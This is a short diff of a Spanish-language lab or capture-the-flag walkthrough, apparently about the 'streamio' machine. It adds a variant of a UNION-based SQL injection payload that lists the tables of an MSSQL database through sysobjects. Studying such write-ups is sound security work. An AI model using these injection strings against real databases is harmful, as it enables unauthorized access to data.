@@ -190,5 +190,7 @@ recordemos que podemos interactuar bajo la posición numero 2 y 3 en este caso y
 de esta manera usando la query hemos logrado enumerar el nombre de las tablas en la base de datos
 ```python 
 10' union select 1,name,3,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- -
+------------------------------------------------------------------------------------------------------------------------------
+10' union select 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype = 'U';-- - sadasdasdas
 ```
 ![[Pasted image 20240514145530.png]]
